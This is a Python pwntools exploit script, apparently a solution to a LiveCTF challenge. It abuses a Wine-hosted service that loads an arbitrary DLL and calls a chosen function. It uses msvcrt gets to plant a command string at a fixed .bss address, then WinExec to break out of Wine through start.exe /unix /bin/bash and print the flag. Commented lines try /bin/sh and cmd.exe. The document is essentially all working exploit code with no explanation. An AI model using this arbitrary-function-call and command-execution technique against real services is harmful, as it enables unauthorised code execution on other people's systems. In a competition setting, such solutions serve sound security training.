#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
# HOST = "localhost"
PORT = 31337


def func(dll,func,argv):
    io.sendlineafter(b"Which module would you like to load?",dll)
    io.sendlineafter(b"What function do you want to call?",func)
    io.sendlineafter(b"What value do you want for the first argument?",str(argv).encode())
                     
io = remote(HOST, int(PORT))
# io = process("wine ./challenge.exe",shell=True)

io.sendlineafter(b"Which module would you like to load?",b"msvcrt.dll")
io.recvuntil(b"Module handle: ")
msvcrt = int(io.recvline().strip(),16)
success(hex(msvcrt))
io.sendlineafter(b"What function do you want to call?",b"gets")

bss = 0x140014100
success(hex(bss))
io.sendlineafter(b"What value do you want for the first argument?",str(bss).encode())
# io.sendline(b"start /unix /bin/sh\x00")
# io.sendline(b'"start.exe"\x00')
# io.sendline(b'"start.exe cmd.exe"\x00')
# io.sendline(b'cmd.exe\x00')
io.sendline(b'start.exe /unix /bin/bash -c "cd /home/livectf;/home/livectf/submitter>&2"\x00')
context.log_level = 'DEBUG'

# io.sendlineafter(b"Which module would you like to load?",b"msvcrt.dll")
# io.sendlineafter(b"What function do you want to call?",b"system")
# io.sendlineafter(b"What value do you want for the first argument?",str(bss).encode())

io.sendlineafter(b"Which module would you like to load?",b"kernel32.dll")
io.sendlineafter(b"What function do you want to call?",b"WinExec")
io.sendlineafter(b"What value do you want for the first argument?",str(bss).encode())

sleep(3)
print(io.recvuntil(b"}"))

# io.interactive()